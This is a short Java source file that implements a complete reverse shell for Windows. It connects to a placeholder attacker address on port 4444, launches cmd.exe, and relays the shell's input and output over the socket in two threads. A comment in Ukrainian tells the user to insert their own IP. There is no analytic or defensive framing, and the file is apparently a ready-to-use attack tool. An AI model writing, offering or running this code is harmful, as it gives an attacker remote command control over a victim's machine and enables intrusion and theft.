import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Main {
    public static void main(String[] args) {
        String host = "ТВОЙ_IP_АДРЕС"; // Замініть на свій IP
        int port = 4444;

        try {
            Socket socket = new Socket(host, port);

            Process process = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();

            InputStream processIn = process.getInputStream();
            OutputStream processOut = process.getOutputStream();
            InputStream socketIn = socket.getInputStream();
            OutputStream socketOut = socket.getOutputStream();

            Thread t1 = new Thread(() -> {
                try {
                    int read;
                    byte[] buffer = new byte[1024];
                    while ((read = processIn.read(buffer)) != -1) {
                        socketOut.write(buffer, 0, read);
                        socketOut.flush();
                    }
                } catch (Exception ignored) {}
            });

            Thread t2 = new Thread(() -> {
                try {
                    int read;
                    byte[] buffer = new byte[1024];
                    while ((read = socketIn.read(buffer)) != -1) {
                        processOut.write(buffer, 0, read);
                        processOut.flush();
                    }
                } catch (Exception ignored) {}
            });

            t1.start();
            t2.start();

            t1.join();
            t2.join();

            process.destroy();
            socket.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}